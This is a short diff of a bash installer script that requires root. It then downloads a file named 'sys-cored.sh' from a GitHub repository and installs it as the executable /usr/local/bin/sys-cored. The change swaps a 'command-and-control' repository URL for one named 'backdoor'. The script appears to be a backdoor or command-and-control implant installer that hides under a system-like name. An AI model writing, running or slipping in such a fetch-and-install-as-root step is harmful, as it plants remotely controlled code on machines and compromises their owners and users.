@@ -1,12 +1,11 @@
 #!/bin/bash
 
-# Must run as root
 if [[ "$EUID" -ne 0 ]]; then
     echo "Please run as root."
     exit 1
 fi
 
-REPO_URL="https://raw.githubusercontent.com/athulnair02/command-and-control/main"
+REPO_URL="https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main"
 
 curl -s "$REPO_URL/sys-cored.sh" -o /usr/local/bin/sys-cored
 chmod +x /usr/local/bin/sys-cored
